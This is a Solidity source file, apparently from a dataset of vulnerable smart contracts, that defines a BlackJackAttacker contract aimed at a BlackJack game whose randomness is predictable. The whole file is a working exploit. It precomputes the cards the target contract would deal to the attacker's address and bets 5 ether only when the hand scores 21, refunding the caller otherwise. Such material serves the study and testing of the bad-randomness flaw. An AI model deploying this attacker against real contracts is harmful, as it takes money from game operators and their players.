pragma solidity ^0.4.9;

import "../dataset/bad_randomness/blackjack.sol";

contract BlackJackAttacker {

    BlackJack blackjack;

    function BlackJackAttacker(address _target) {
        blackjack = BlackJack(_target);
    }

    // using Deck for *;

    function() external payable {
    }

    function _calculateScore(uint8[] memory cards) internal view returns (uint8, uint8) {
        uint8 score = 0;
        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores
        bool bigAceUsed = false;
        for (uint256 i = 0; i < cards.length; ++i) {
            uint8 card = cards[i];
            if (Deck.isAce(card) && !bigAceUsed) {
                // doesn't make sense to use the second Ace as 11, because it leads to the losing
                scoreBig += Deck.valueOf(card, true);
                bigAceUsed = true;
            } else {
                scoreBig += Deck.valueOf(card, false);
            }
            score += Deck.valueOf(card, false);
        }
        return (score, scoreBig);
    }

    function play() public payable {

        uint8[] memory playerCards = new uint8[](2);
        playerCards[0] = Deck.deal(address(this), 0);
        playerCards[1] = Deck.deal(address(this), 2);
        
        (uint8 score, uint8 scoreBig) = _calculateScore(playerCards);

        if (scoreBig == 21 || score == 21) {
            blackjack.deal.value(5 ether)();
        } else {
            msg.sender.transfer(msg.value);
        }
    }

}